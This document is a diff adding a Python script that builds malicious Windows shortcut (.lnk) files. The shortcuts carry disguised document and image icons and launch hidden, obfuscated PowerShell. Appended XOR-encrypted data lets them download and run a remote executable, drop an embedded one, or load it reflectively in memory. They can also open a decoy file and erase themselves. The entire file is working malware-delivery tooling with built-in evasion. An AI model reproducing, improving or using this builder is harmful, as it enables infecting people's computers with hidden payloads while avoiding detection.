@@ -1,0 +1,280 @@
+import os
+import base64
+import uuid
+import random
+import string
+import pythoncom
+from win32com.shell import shell
+import argparse
+
+
+def xor_data(data_bytes, key_string):
+    key_bytes = key_string.encode('utf-8')
+    return bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data_bytes)])
+
+
+parser = argparse.ArgumentParser()
+
+##### ICON_MAP
+ICON_MAP = {
+    "image2": r"C:\Windows\System32\imageres.dll,78",
+    "image": r"C:\Windows\System32\imageres.dll,215",
+    "audio": r"C:\Windows\System32\imageres.dll,113",
+    "video": r"C:\Windows\System32\imageres.dll,114",
+    "folder": r"C:\Windows\System32\shell32.dll,3",
+    "pdf": r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,11",
+    "txt": r"C:\Windows\System32\shell32.dll,151"
+}
+
+##### VIEW_MODE_MAP
+VIEW_MODE_MAP = {
+    "hidden-window": 7,
+    "full-size-window": 3,
+    "normal-size-window": 1
+}
+
+parser.add_argument("-mode",
+                    choices=["downloader", "smuggle", "smuggle_memory_load", "zip_downloader"],
+                    required=True)
+
+parser.add_argument("-download_link")
+
+parser.add_argument("-payload_path", required=False, default=None)
+
+parser.add_argument("-extension", default="")
+
+parser.add_argument("-decoy_path")
+
+parser.add_argument("-self_destruct", choices=["replace_with_decoy", "delete"])
+
+parser.add_argument("-output_file_name",
+                    default=''.join(random.choices(string.ascii_uppercase + string.digits, k=8)))
+
+parser.add_argument("-icon", choices=["image", "image2", "folder", "browser", "video", "audio", "pdf", "txt"])
+
+parser.add_argument("-view_mode",
+                    choices=["hidden-window", "full-size-window", "normal-size-window"],
+                    default="normal-size-window")
+
+
+args = parser.parse_args()
+
+####### CONFIGURATION
+ICON_LOCATION = ICON_MAP.get(args.icon, r"C:\Windows\System32\shell32.dll,999")
+WINDOW_STYLE = VIEW_MODE_MAP.get(args.view_mode)
+if args.payload_path is not None:
+    PAYLOAD_PATH = args.payload_path
+DECOY_PATH = args.decoy_path
+OUTPUT_FILENAME = f"{args.output_file_name}{args.extension}.lnk"
+
+################## VARS ###
+
+#### randomize internal storage placeholders:
+INNER_JUNK = "".join(random.choices(string.ascii_uppercase + string.digits, k=7))
+MAGIC_MARKER = uuid.uuid4()
+#
+INTERNAL_SCRIPT_B64_VARIABLE = "".join(random.choices(string.ascii_uppercase + string.digits, k=4))
+XOR_KEY_VARIABLE = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
+PAYLOAD_XOR_KEY = "".join(random.choices(string.ascii_uppercase + string.digits, k=13))
+ENCRYPTED_EXE_B64_VARIABLE = "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
+DECOY_BASE64_STORAGE_VARIABLE = "".join(random.choices(string.ascii_uppercase + string.digits, k=4))
+
+#### randomize external ps command:
+data_string = "".join(random.choices(string.ascii_uppercase + string.digits, k=5))
+obfuscatedDropperB64 = "".join(random.choices(string.ascii_uppercase + string.digits, k=7))
+decodedDropper = "".join(random.choices(string.ascii_uppercase + string.digits, k=3))
+cleanDropper = "".join(random.choices(string.ascii_uppercase + string.digits, k=4))
+magicMarker = "".join(random.choices(string.ascii_uppercase + string.digits, k=5))
+searchPath = "".join(random.choices(string.ascii_uppercase + string.digits, k=3))
+foundLnkPath = "".join(random.choices(string.ascii_uppercase + string.digits, k=4))
+random_var123 = "".join(random.choices(string.ascii_uppercase + string.digits, k=3))
+
+EXTERNAL_PS_COMMAND = f"""
+${magicMarker} = '{MAGIC_MARKER}';
+${searchPath} = $env:USERPROFILE;
+${random_var123} = @{{}};
+${foundLnkPath} = Get-ChildItem -Path ${searchPath} -Filter *.lnk -Recurse -ErrorAction SilentlyContinue | Where-Object {{
+    [System.IO.File]::ReadAllText($_.FullName).Contains(${magicMarker})
+}} | Select-Object -First 1 -ExpandProperty FullName;
+
+if (${foundLnkPath}) {{
+    ${data_string}=[System.IO.File]::ReadAllText(${foundLnkPath}).Split(${magicMarker},2)[1];
+    ${data_string}.Split([Environment]::NewLine)|%{{if($_-like'*=*'){{$k,$v=$_.Split('=',2);${random_var123}[$k.Trim()]=$v.Trim()}}}};
+    ${obfuscatedDropperB64} = ${random_var123}['{INTERNAL_SCRIPT_B64_VARIABLE}'];
+    ${decodedDropper} = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(${obfuscatedDropperB64}));
+    ${cleanDropper} = ${decodedDropper}.Substring({len(INNER_JUNK)});
+    Invoke-Expression ${cleanDropper};
+}}
+"""
+
+# """
+######## obfuscation vars to hide and split the external ps command
+var1 = "".join(random.choices(string.ascii_uppercase + string.digits, k=35))
+var2 = "".join(random.choices(string.ascii_uppercase + string.digits, k=153))
+START_OF_COMMAND_JUNK_LENGTH = 1114
+START_OF_COMMAND_JUNK_PREFIX = ''.join(
+    random.choices(string.ascii_letters + string.digits, k=START_OF_COMMAND_JUNK_LENGTH))
+
+#### randomize internal ps commands:
+key = "".join(random.choices(string.ascii_uppercase + string.digits, k=14))
+encB64 = "".join(random.choices(string.ascii_uppercase + string.digits, k=70))
+encBytes = "".join(random.choices(string.ascii_uppercase + string.digits, k=16))
+decBytes = "".join(random.choices(string.ascii_uppercase + string.digits, k=42))
+exeB64 = "".join(random.choices(string.ascii_uppercase + string.digits, k=5))
+exeBytes = "".join(random.choices(string.ascii_uppercase + string.digits, k=9))
+payload_name = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
+tmpPath = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
+foundLnkPath = "".join(random.choices(string.ascii_uppercase + string.digits, k=4))
+
+### DEOCY
+DECOY_BASE64_VARIABLE = "".join(random.choices(string.ascii_uppercase + string.digits, k=9))
+htmlText = "".join(random.choices(string.ascii_uppercase + string.digits, k=16))
+decode_base64_decoy = "".join(random.choices(string.ascii_uppercase + string.digits, k=7))
+baseName = "".join(random.choices(string.ascii_uppercase + string.digits, k=13))
+directory = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
+newPath = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
+decoyB64 = "".join(random.choices(string.ascii_uppercase + string.digits, k=24))
+decoy_name = "".join(random.choices(string.ascii_uppercase + string.digits, k=22))
+
+### downloader
+downloadexename = "".join(random.choices(string.ascii_uppercase + string.digits, k=5))
+
+
+internal_payload_modes = {
+    "downloader": fr"""$url = "{args.download_link}";$path = "$env:LOCALAPPDATA\{downloadexename}.exe";(New-Object System.Net.WebClient).DownloadFile($url, $path);Start-Process $path;""",
+    "zip_downloader": fr"""
+        $url = "{args.download_link}";
+        $zipPath = Join-Path $env:TEMP "package.zip";
+        $extractPath = $env:TEMP;
+        $exeToRun = Join-Path $extractPath "openvpn\my_file.exe";
+        (New-Object System.Net.WebClient).DownloadFile($url, $zipPath);
+        Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force;
+        Start-Process -FilePath $exeToRun;
+        """,
+    "smuggle": f"""
+        ${key} = ${random_var123}['{XOR_KEY_VARIABLE}'];
+        ${encB64} = ${random_var123}['{ENCRYPTED_EXE_B64_VARIABLE}'];
+        ${encBytes}=[Convert]::FromBase64String(${encB64});
+        ${decBytes}=New-Object byte[] ${encBytes}.Length;
+        for($i=0;$i-lt ${encBytes}.Length;$i++){{${decBytes}[$i]=${encBytes}[$i]-bxor[char]${key}[$i%${key}.Length]}};
+        ${exeB64}=[System.Text.Encoding]::ASCII.GetString(${decBytes});
+        ${exeBytes}=[Convert]::FromBase64String(${exeB64});
+        ${tmpPath}="$env:TEMP\\{payload_name}.exe";
+        [IO.File]::WriteAllBytes(${tmpPath},${exeBytes});
+        Start-Process ${tmpPath};
+    """,
+    "smuggle_memory_load": f"""
+        ${key} = ${random_var123}['{XOR_KEY_VARIABLE}'];
+        ${encB64} = ${random_var123}['{ENCRYPTED_EXE_B64_VARIABLE}'];
+        ${encBytes}=[Convert]::FromBase64String(${encB64});
+        ${decBytes}=New-Object byte[] ${encBytes}.Length;
+        for($i=0;$i-lt ${encBytes}.Length;$i++){{${decBytes}[$i]=${encBytes}[$i]-bxor[char]${key}[$i%${key}.Length]}};
+        ${exeB64}=[System.Text.Encoding]::ASCII.GetString(${decBytes});
+        ${exeBytes}=[Convert]::FromBase64String(${exeB64});
+        $banana = [System.Reflection.Assembly]::Load(${exeBytes})
+        $banana.EntryPoint.Invoke($null, @(,[string[]]@()))
+    """
+}
+
+
+def payload_builder(mode):
+
+    decoy_commands = {
+        "file":   f"""
+                            ${foundLnkPath} = Get-ChildItem -Path ${searchPath} -Filter *.lnk -Recurse -ErrorAction SilentlyContinue | Where-Object {{
+                                [System.IO.File]::ReadAllText($_.FullName).Contains(${magicMarker})
+                            }} | Select-Object -First 1 -ExpandProperty FullName;
+                            ${DECOY_BASE64_VARIABLE} = ${random_var123}['{DECOY_BASE64_STORAGE_VARIABLE}'];
+                            ${decode_base64_decoy} = [System.Convert]::FromBase64String(${DECOY_BASE64_VARIABLE});
+                            $banana = [System.IO.Path]::GetFileNameWithoutExtension(${foundLnkPath})
+                            ${tmpPath}="$env:TEMP\\$banana";
+                            [IO.File]::WriteAllBytes(${tmpPath},${decode_base64_decoy});
+                            Start-Process ${tmpPath};`
+                        """
+    }
+    payload_script = internal_payload_modes.get(mode)
+
+    if args.decoy_path:
+        decoy_command = decoy_commands['file']
+        payload_script += "\n" + decoy_command
+
+    if args.self_destruct == 'delete':
+        payload_script += "\n" + f"""
+                                    ${foundLnkPath} = Get-ChildItem -Path ${searchPath} -Filter *.lnk -Recurse -ErrorAction SilentlyContinue | Where-Object {{
+                                        [System.IO.File]::ReadAllText($_.FullName).Contains(${magicMarker})
+                                    }} | Select-Object -First 1 -ExpandProperty FullName;
+                                    if (${foundLnkPath}) {{
+                                        Remove-Item -Path ${foundLnkPath} -Force -ErrorAction SilentlyContinue;
+                                    }}
+                                  """
+
+    elif args.self_destruct == 'replace_with_decoy':
+        payload_script += "\n" + f"""
+        if (${foundLnkPath}) {{
+            ${baseName} = [System.IO.Path]::GetFileNameWithoutExtension(${foundLnkPath});
+            ${directory} = [System.IO.Path]::GetDirectoryName(${foundLnkPath});
+            ${newPath} = [System.IO.Path]::Combine(${directory}, ${baseName});
+            Remove-Item -Path ${foundLnkPath} -Force -ErrorAction SilentlyContinue;
+            [IO.File]::WriteAllBytes(${newPath}, ${decode_base64_decoy});
+        }} 
+        """
+    else:
+        pass
+
+    return payload_script
+
+
+INTERNAL_PAYLOAD = payload_builder(args.mode)
+substringed_external_command = START_OF_COMMAND_JUNK_PREFIX + EXTERNAL_PS_COMMAND
+final_external_payload_b64 = base64.b64encode(substringed_external_command.encode('utf-8')).decode('ascii')
+
+lnk_binary_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+final_arguments = f"-WindowStyle Hidden -Command \"${var1} = '{final_external_payload_b64}'; ${var2} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${var1})); Invoke-Expression ${var2}.Substring({START_OF_COMMAND_JUNK_LENGTH}); Exit\""
+
+link_filepath = os.path.join(os.path.expanduser("~"), "Desktop", "Python", "2025", "lnk-builder", "outputs", OUTPUT_FILENAME)
+print(f"\n-- Creating the base .lnk file at: {link_filepath}")
+
+try:
+    shell_link = pythoncom.CoCreateInstance(shell.CLSID_ShellLink, None, pythoncom.CLSCTX_INPROC_SERVER,
+                                            shell.IID_IShellLink)
+    shell_link.SetPath(lnk_binary_path)
+    shell_link.SetArguments(final_arguments)
+
+    # SET ICON
+    icon_path, icon_index_str = ICON_LOCATION.split(',')
+    shell_link.SetIconLocation(icon_path, int(icon_index_str))
+    shell_link.SetShowCmd(WINDOW_STYLE)
+
+    # SAVE LNK FILE
+    persist_file = shell_link.QueryInterface(pythoncom.IID_IPersistFile)
+    persist_file.Save(link_filepath, 0)
+
+except Exception as e:
+    print(f"\n[ERROR] Failed to create the base shortcut: {e}")
+    exit(1)
+
+obfuscated_internal_script = base64.b64encode((INNER_JUNK + INTERNAL_PAYLOAD).encode('utf-8')).decode(
+        'ascii')
+
+data_to_append = f"\r\n{MAGIC_MARKER}\r\n"
+data_to_append += f"{XOR_KEY_VARIABLE}={PAYLOAD_XOR_KEY}\r\n"
+data_to_append += f"{INTERNAL_SCRIPT_B64_VARIABLE}={obfuscated_internal_script}\r\n"
+
+fmodes = ["downloader", "zip_downloader"]
+if args.mode not in fmodes:
+    payload_b64 = base64.b64encode(open(PAYLOAD_PATH, 'rb').read()).decode('ascii')
+    encrypted_exe_b64 = base64.b64encode(xor_data(payload_b64.encode('utf-8'), PAYLOAD_XOR_KEY)).decode('ascii')
+    data_to_append += f"{ENCRYPTED_EXE_B64_VARIABLE}={encrypted_exe_b64}\r\n"
+
+if args.decoy_path:
+    DECOY_BASE64 = base64.b64encode(open(DECOY_PATH, 'rb').read()).decode('ascii')
+    data_to_append += f"{DECOY_BASE64_STORAGE_VARIABLE}={DECOY_BASE64}\r\n"
+
+print("-- Binding data-block to the created LNK file.")
+try:
+    with open(link_filepath, 'ab') as f:
+        f.write(data_to_append.encode('utf-8'))
+    print("\n[SUCCESS] The data-block added successfully.")
+except Exception as e:
+    print(f"\n[ERROR] Failed to bind data to the shortcut")
+
